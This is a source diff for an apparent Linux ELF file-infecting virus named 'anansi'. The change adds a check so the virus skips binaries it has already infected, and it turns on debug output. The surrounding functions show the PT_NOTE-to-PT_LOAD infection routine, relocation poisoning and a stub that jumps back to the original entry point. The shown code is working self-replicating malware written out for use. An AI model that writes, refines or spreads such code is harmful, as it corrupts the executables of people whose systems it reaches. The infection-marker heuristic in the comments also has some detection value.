@@ -33,6 +33,7 @@
 	#define MAX_TARGET 3
 #endif
 
+
 //misc macros
 #define RDRAND_BIT (1 << 30)
 #define EPILOG_SIZE 30
@@ -71,6 +72,7 @@ extern unsigned long real_start;
 // functions unique to anansi
 int dispatch_infection(Elfbin *target);
 void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_entry);
+bool is_already_infected(Elfbin *target);
 void pt_note_infect(Elfbin *target);
 bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *r);
 bool within_section(Elfbin *target, char *section, uint64_t addr);
@@ -253,6 +255,7 @@ void vx_main()
 	int cwd_fd, attr, max_target = MAX_TARGET;
 	const size_t DIR_LISTING_SIZE = 5000;
 
+	bool already_infected;
 	Elfbin target;
 
 	uint64_t vx_size = (uint8_t *)&end_vx - (uint8_t *)&real_start;
@@ -260,20 +263,13 @@ void vx_main()
 
 	char anansi_msg[] = "anansi-works\n";
 	anansi_write(STDOUT_FILENO, anansi_msg, anansi_strlen(anansi_msg));
-	/*
+
 #ifdef DEBUG
 	anansi_printf("vx_start @ 0x0%lx\n", vx_start);
 	anansi_printf("vx_size @ 0x%lx\n", vx_size);
 	anansi_printf("max_target @ %d\n", max_target);
 #endif
-*/
-/*
-	char vx_start_msg[] = "vx_start @ %lx\n";
-	anansi_printf(vx_start_msg, vx_start);
 
-	char vx_size_msg[] = "vx_size @ 0x%lx\n";
-	anansi_printf(vx_size_msg, vx_size);
-*/
 	if(!(cwd = anansi_malloc(PATH_MAX)))
 		goto clean_up;
 
@@ -311,8 +307,16 @@ void vx_main()
 		write_vx_meta_data(&target, vx_start, vx_size);
 		if(process_elf(&target, attr, PROCESS_ELF_O_RDWR, vx_size) == SUCCESS)
 			if (valid_target(&target, sizeof(Elf64_Ehdr), false)) {
-				dispatch_infection(&target);
-				max_target--;
+				already_infected = is_already_infected(&target);
+				if(!already_infected) {
+					dispatch_infection(&target);
+					max_target--;
+				}
+#ifdef DEBUG
+				if(already_infected) {
+					anansi_printf("File %s is already infected.\n", full_path);
+				}
+#endif
 			}
 
 		anansi_munmap(full_path, anansi_strlen(full_path) + 1);
@@ -338,6 +342,7 @@ int dispatch_infection(Elfbin *target)
 	char filename_append[] = ".0ut";
 
 	bool use_reloc_poison;
+
 #ifdef DEBUG
 	anansi_printf("Viable target: %s\n", target->f_path);
 #endif
@@ -442,6 +447,25 @@ void append_ret_2_OEP_stub(uint8_t *insertion, Elfbin *target, uint64_t orig_ent
 	epilog[29] = 0xc3; //ret
 	anansi_memcpy(insertion + target->vx_size, epilog, 30);
 }
+
+/* The PT_NOTE -> PT_LOAD infection algorithm appends to the host, that is the virus comes after the section header table.
+ * Using this logic, we can look for PT_LOAD segments that have a file offset that is: hdr->e_shoff + (hdr->e_shnum + hdr->e_shentsize).
+ * Executable code after the section header table will be the anomaly we look for when detecting infected files (or files infected with another pt_note virus ;)).
+ */
+
+bool is_already_infected(Elfbin *target)
+{
+	Elf64_Phdr *phdr = target->phdr;
+	uint64_t vx_off = target->ehdr->e_shoff + (target->ehdr->e_shnum * target->ehdr->e_shentsize);
+	for(int i = 0; i < target->ehdr->e_phnum; i++) {
+		if(phdr[i].p_type == PT_LOAD && phdr[i].p_offset == vx_off){
+			return true;
+		}
+	}
+	return false;
+}
+
+
 
 void pt_note_infect(Elfbin *target)
 {
